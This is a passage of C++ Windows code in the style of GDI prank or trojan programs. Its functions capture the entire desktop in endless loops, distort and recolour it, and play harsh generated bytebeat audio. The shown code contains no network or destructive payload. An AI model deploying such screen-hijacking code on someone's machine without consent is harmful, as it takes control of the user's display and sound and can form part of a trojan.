		TextOutW(hdc, 25, 75, text3, wcslen(text3));
		TextOutW(hdc, 25, 100, text4, wcslen(text4));
		ReleaseDC(0, hdc);
    }
}
DWORD WINAPI shader1(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += w | ((x - w / 2) * (x - w / 2) + (y - h / 2) * (y - h / 2));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader2(LPVOID lpParam) {
	PRGBTRIPLE rgbtriple; int xxx = 0; POINT point[3];
	while (true) {
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1), increment = 1 + rand() % 20, rndsize = 1 + rand() % (h / 2);
		BITMAPINFO bmi = { 40, w, h, 1, 24 };
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w, t = (x ^ y);
			rgbtriple[i].rgbtRed += t + x + xxx;
			rgbtriple[i].rgbtGreen ^= t + (x | y) + i + xxx;
			rgbtriple[i].rgbtBlue += t + y + xxx;
		}
		for (int y = 0; y < h; y++) {
			StretchBlt(hcdc, -2 + rand() % 5, y, w, 1, hcdc, 0, y, w, 1, SRCCOPY);
		}
		if (rand() % 10 >= 5) {
			point[0].x = increment; point[0].y = -increment;
			point[1].x = w + increment; point[1].y = increment;
			point[2].x = -increment; point[2].y = h - increment;
		}
		else {
			point[0].x = -increment; point[0].y = increment;
			point[1].x = w - increment; point[1].y = -increment;
			point[2].x = increment; point[2].y = h + increment;
		}
		PlgBlt(hcdc, point, hcdc, 0, 0, w, h, 0, 0, 0);
		BitBlt(hcdc, rand() % 20, rand() % 20, w, h, hcdc, rand() % 20, rand() % 20, SRCPAINT);
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCERASE);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		Sleep(1); xxx += 5;
	}
}
DWORD WINAPI shader3(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = -h;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* pBits = nullptr;

	srand(time(NULL));

	while (true) {
		HDC hdc = GetDC(NULL);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

		for (int y = 0; y < h; ++y) {
			for (int x = 0; x < w; ++x) {
				int index = x ^ y * w;

				BYTE originalRed = pBits[index].rgbRed;
				BYTE originalGreen = pBits[index].rgbGreen;
				BYTE originalBlue = pBits[index].rgbBlue;

				BYTE fractalRed = (x ^ y) * 9;
				BYTE fractalGreen = (x ^ y) * 9;
				BYTE fractalBlue = x ^ y ^ 9;

				pBits[index].rgbRed = static_cast<BYTE>(0.5 * originalRed + 0.5 * fractalRed);
				pBits[index].rgbGreen = static_cast<BYTE>(0.5 * originalGreen + 0.5 * fractalGreen);
				pBits[index].rgbBlue = static_cast<BYTE>(0.5 * originalBlue + 0.5 * fractalBlue);

				pBits[index].rgbRed = static_cast<BYTE>(pBits[index].rgbRed * 0.8);
				pBits[index].rgbGreen = static_cast<BYTE>((pBits[index].rgbGreen * 0.8));
				pBits[index].rgbBlue = static_cast<BYTE>(pBits[index].rgbBlue * 0.8);

				pBits[index].rgbRed = static_cast<BYTE>(0.3 * fractalBlue + 0.6 * fractalGreen);
				pBits[index].rgbGreen = static_cast<BYTE>(0.3 * fractalRed + 0.6 * fractalBlue);
				pBits[index].rgbBlue = static_cast<BYTE>(0.3 * fractalGreen + 0.6 * fractalRed);
			}
		}
		BLENDFUNCTION blur;
		blur.BlendOp = AC_SRC_OVER;
		blur.BlendFlags = 0;
		blur.AlphaFormat = 0;
		blur.SourceConstantAlpha = 50;
		AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
		ReleaseDC(NULL, hdc);
		ReleaseDC(NULL, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc);
		DeleteDC(hdc);
	}
	return 0;
}
DWORD WINAPI shader4(LPVOID lpParam) {
	int i = 0;
	while (true) {
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		BITMAPINFO bmpi = { 0 };
		bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		RGBQUAD* rgbquad = NULL;
		HSL hslcolor; RGBQUAD rgbquadCopy;
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(hcdc, hBitmap);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = x * h + y;
				rgbquad[index].rgbRed = (i & x) + i;
				rgbquad[index].rgbGreen = (i | y) + i;
				rgbquad[index].rgbBlue = (i ^ x + y) + i;
			}
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hdc); DeleteDC(hcdc);
		Sleep(1); i += 2;
	}
	return 0;
}
DWORD WINAPI shader5(LPVOID lpParam) {
	int xxx = 0; BLENDFUNCTION blur = { AC_SRC_OVER, 0, 80, 0 };
	while (true) {
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		BITMAPINFO bmi = { 0 };
		bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		RGBQUAD* pBits = nullptr;
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
		SelectObject(hcdc, hBitmap);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y + x * h;
				double wave = tan((x + xxx) * 0.03) + sqrt((y + xxx) * 0.03);
				pBits[index].rgbRed = (256 * sqrt(wave) * 0.9);
				pBits[index].rgbGreen = (512 * tan(wave) * 1.4);
				pBits[index].rgbBlue = (1024 * tan(wave) * 1.8);
			}
		}
		AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		xxx += 10;
		Sleep(1);
	}
	return 0;
}
DWORD WINAPI shader6(LPVOID lpParam) {
	int i = 0;
	while (true) {
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		BITMAPINFO bmpi = { 0 };
		bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		RGBQUAD* rgbquad = NULL; HSL hslcolor;
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x, fx = ((x + (10 * i)) ^ y) + (i * 10);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h += fmod(fx / 200.f + y / h * .2f, 1.f);
				hslcolor.s = 1.f;  hslcolor.l += 1.f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		Sleep(1);
	}
	return 0;
}
DWORD WINAPI shader7(LPVOID lpParam) {
	srand(time(NULL));
	int xxx = 0; BLENDFUNCTION blur = BLENDFUNCTION{ AC_SRC_OVER, 1, 80, 0 };
	while (true) {
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1), rndsize = 1 + rand() % (h / 2), rndsize2 = 1 + rand() % (h / 2);
		BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
		bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
		SelectObject(hcdc, hBitmap);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			rgbScreen[i].rgb += ((x ^ i) * (y ^ i) + i + xxx);
		}
		for (int yyy = 0; yyy < h; yyy += rndsize) {
			StretchBlt(hcdc, -2 + rand() % 5, yyy, w, rndsize, hcdc, 0, yyy, w, rndsize, SRCAND);
		}
		for (int yyy = 0; yyy < h; yyy += rndsize2) {
			StretchBlt(hcdc, -5 + rand() % 11, yyy, w, rndsize2, hcdc, 0, yyy, w, rndsize2, SRCCOPY);
		}
		AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		Sleep(1); xxx += 4;
	}
}
DWORD WINAPI shader8(LPVOID lpParam) {
	PRGBQUAD prgbScreen; int jingui = 0;
	while (true) {
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		BITMAPINFO bmi = { 0 };
		bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int binggan = 1 + rand() % 25;
		for (int i = 0; i < w * h; i++) {
			prgbScreen[i].rgb *= ((jingui * binggan + i) / 5);
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		jingui++;
		Sleep(10);
	}
}
DWORD WINAPI shader9a(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);

	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;

	PRGBQUAD prgbScreen;
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hcdc, hBitmap);

	for (; ; ) {
		hdc = GetDC(NULL);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, 13369376);
		for (int y = 0; y < h; y++) {
			for (int x = 0; x < w; x++) {
				int rgb = (prgbScreen[x + w * y].r + prgbScreen[x + w * y].g + prgbScreen[x + w * y].b) / 3;
				prgbScreen[x + w * y].r = rgb;
				prgbScreen[x + w * y].g = rgb;
				prgbScreen[x + w * y].b = rgb;
			}
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, 13369376);
		ReleaseDC(NULL, hdc);
		DeleteObject(hdc);
		Sleep(100);
	}

	ReleaseDC(NULL, hcdc);
	DeleteObject(hcdc);
	DeleteObject(hBitmap);
	return 0;
}

DWORD WINAPI shader9b(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	PRGBQUAD prgbScreen;
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hcdc, hBitmap);
	for (;;) {
		hdc = GetDC(NULL);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < h; i++) {
			for (int j = 0; j < w; j++) {
				int y = (i + rand() % 11 - 5);
				if (y < 0) {
					y = -y;
				}
				int x = (j + rand() % 11 - 5);
				if (x < 0) {
					x = -x;
				}
				prgbScreen[i * w + j].rgb = prgbScreen[(y * w + x) % (w * h)].rgb;
			}
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteObject(hdc);
		Sleep(10);
	}
	DeleteObject(hBitmap);
	DeleteDC(hcdc);

	return 0;
}
DWORD WINAPI shader10(LPVOID lpParam) {//credits to pankoza, but i modified it
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i / w, y = i % w;
			rgbScreen[i].r ^= x ^ y;
			rgbScreen[i].rgb += 720;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		Sleep(10);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader11(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = -h;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* pBits = NULL;
	srand(time(NULL));
	for (int i = 0;; ++i) {
		HDC hdc = GetDC(NULL);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, BLACKNESS);
		for (int y = 0; y < h; ++y) {
			for (int x = 0; x < w; ++x) {
				int index = x ^ y * w;
				BYTE originalRed = pBits[index].rgbRed;
				BYTE originalGreen = pBits[index].rgbGreen;
				BYTE originalBlue = pBits[index].rgbBlue;
				BYTE fractalRed = (x ^ y) + i * 1;
				BYTE fractalGreen = (x ^ y) * i * 0;
				BYTE fractalBlue = (x ^ y) | i * 2;
				pBits[index].rgbRed = static_cast<BYTE>(1 * originalRed + 0.5 * fractalRed);
				pBits[index].rgbGreen = static_cast<BYTE>(0.5 * fractalGreen);
				pBits[index].rgbBlue = static_cast<BYTE>(2 * originalBlue + fractalBlue);
				pBits[index].rgbRed = static_cast<BYTE>(pBits[index].rgbRed * 0.5);
				pBits[index].rgbGreen = static_cast<BYTE>((pBits[index].rgbGreen * 0.5));
				pBits[index].rgbBlue = static_cast<BYTE>(pBits[index].rgbBlue * 0.5);
				pBits[index].rgbRed = static_cast<BYTE>(0.5 * fractalBlue + 0.5 * fractalGreen);
				pBits[index].rgbGreen = static_cast<BYTE>(0.5 * fractalRed + 0.5 * fractalBlue);
				pBits[index].rgbBlue = static_cast<BYTE>(0.5 * fractalGreen + 0.5 * fractalRed);
			}
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		ReleaseDC(NULL, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc);
		DeleteDC(hdc);
	}
	return 0;
}
DWORD WINAPI shader12(LPVOID lpParam) {//credits to coder-linjian
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 40, w, h, 1, 24 };
	PRGBTRIPLE rgbtriple;
	for (;;) {
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int sepiaRed = round(.114 * rgbtriple[i].rgbtRed + .514 * rgbtriple[i].rgbtGreen + .191 * rgbtriple[i].rgbtBlue);
			int sepiaGreen = round(.191 * rgbtriple[i].rgbtRed + .888 * rgbtriple[i].rgbtGreen + .256 * rgbtriple[i].rgbtBlue);
			int sepiaBlue = round(.365 * rgbtriple[i].rgbtRed + .666 * rgbtriple[i].rgbtGreen + .222 * rgbtriple[i].rgbtBlue);

			if (sepiaBlue > 255)
			{
				sepiaBlue = 255;
			}

			if (sepiaRed > 255)
			{
				sepiaRed = 255;
			}

			if (sepiaGreen > 255)
			{
				sepiaGreen = 255;
			}
			rgbtriple[i].rgbtRed += sepiaRed;
			rgbtriple[i].rgbtGreen -= sepiaGreen;
			rgbtriple[i].rgbtBlue -= sepiaBlue;
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		ReleaseDC(NULL, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc);
		DeleteDC(hdc);
	}
	return 0;
}
DWORD WINAPI shader13(LPVOID lpvd) //credits to pankoza
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * sqrt(x ^ y ^ i ^ 7 | x + y));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, -10, -10, screenWidth + 20, screenHeight + 20, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader14(LPVOID lpParam) {
	HBRUSH hBrush; int size = 128;
	while (true) {
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		BITMAPINFO bmpi = { 0 };
		bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		RGBQUAD* rgbquad = NULL; HSL hslcolor;
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = x * h + y;
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(0, 0);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		for (int x = 0; x < w; x += size) {
			for (int y = 0; y < h; y += size) {
				hBrush = CreateSolidBrush(RndRGB);
				SelectObject(hcdc, hBrush);
				PatBlt(hcdc, x, 0, size, h, PATINVERT);
				DeleteObject(hBrush);
				hBrush = CreateSolidBrush(RndRGB);
				SelectObject(hcdc, hBrush);
				PatBlt(hcdc, 0, y, w, size, PATINVERT);
				DeleteObject(hBrush);
			}
		}
		for (int x = 0; x < w; x += 50) {
			StretchBlt(hcdc, x, -20 + rand() % 40, 50, h, hcdc, x, 0, 50, h, SRCAND);
		}
		for (int y = 0; y < h; y += 50) {
			StretchBlt(hcdc, -20 + rand() % 40, y, w, 50, hcdc, 0, y, w, 50, SRCPAINT);
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hdc); DeleteDC(hcdc);
		Sleep(50);
	}
	return 0;
}
DWORD WINAPI blackandwhite(LPVOID lpvd)//credits to coder-linjian
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				int fx = (int)((i ^ 4) + (i * 4) * pow(30, 1.0 / 3));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
		Sleep(5);
	}

	return 0;
}
VOID WINAPI sound1() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((0x21cc21cc >> ((t >> 9) & 0x1e)) & 0xf) * t | (~t >> 4));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound2() {
	int nSamplesPerSec = 12050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t >> (6 - ((t & 0x1000) != 0) & 0x1f)) | 0x9f) * t);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound3() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(29 * t * (t >> 7));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound4() {
	int nSamplesPerSec = 13000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
